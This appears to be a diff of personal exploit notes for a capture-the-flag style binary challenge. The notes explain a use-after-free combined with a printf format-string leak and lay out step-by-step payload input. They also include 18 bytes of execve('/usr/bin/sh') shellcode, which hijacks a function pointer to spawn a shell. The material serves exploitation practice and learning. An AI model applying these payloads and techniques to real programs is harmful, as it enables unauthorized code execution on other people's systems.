@@ -19,25 +19,33 @@ the program allocates a 40 byte 'buf':
     the next 8 are a pointer to the function greetings(), which is called at the start of echo2() and echo3()
     the last 8 are a pointer to the function byebye(), which is called at the end of echo2() and echo3()
 EXP1: exiting the program through the (4) menu frees 'buf', EVEN if the user cancels the exit request
+EXP2: menu (2) -- FSB echo, echo2() -- asks for a string s (up to 32 chars, stored on the stack) and calls printf(s)
+    so we can give it "%[n]$p" to print the address of the nth argument
+        POSIX specifies that errno is set on error. It also specifies additional conversion specifications, most notably support for argument reordering (n$ immediately after % indicates nth argument). https://en.cppreference.com/w/c/io/fprintf
+    x64 SYSV: first 6 args are in registers RDI-RSI-RDX-RCX-R8-R9, then following from stack esp | esp-0x8 | esp - 0xa...
+    in echo2(), at time of get_input->printf(), the 10th argument (4th item on stack) contains rbp: top of main()'s stack
+    subtracting by 0x20 then yields &name
 echo3 mallocs 32 bytes of memory for the user to input something, echoes it back, then frees it
     freeing it modifies the first 16 bytes, but leaves the last 16 intact -- so we can control the contents of e3buf[16:]
     if the 'buf' is freed through EXP1, then echo3's malloc will return a pointer to 'buf' -- so we can control the contents of buf[16:]
         importantly, this includes buf[24:], which nominally contains a pointer to greetings()
 
+https://axcheron.github.io/exploit-101-format-strings/
+
 so:
     1. start program and install shellcode into 'name'
     2. call echo3 and install "/usr/bin/sh" at e3buf[16]
-    3. do EXP1 to free 'buf'
-    4. call echo3 and install &name at buf[24]
-    5. call echo2() or echo3()
+    3. do EXP2 to leak address of &name
+    4. do EXP1 to free 'buf'
+    5. call echo3 and install &name at buf[24]
+    6. call echo2() or echo3()
 
 \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n
 3\nAAAABBBBCCCCDDDD/usr/bin/sh\x00\n
+2\n%%10\$p\n
 4\nn\n
-3\nAAAABBBBCCCCDDDDEEEEFFFF\x00\xea\xff\xff\xff\x7f\x00\x00\n
+3\nAAAABBBBCCCCDDDDEEEEFFFF[&name]
 2\n
-
-printf "\xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n3\nAAAABBBBCCCCDDDD/usr/bin/sh\x00\n4\nn\n3\nAAAABBBBCCCCDDDDEEEEFFFF\x00\xea\xff\xff\xff\x7f\x00\x00\n2\n" > /tmp/p4yload
 
 shellcode (18 bytes):  \xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05
     b8 3b 00 00 00  mov    eax,0x3b     ; execve()
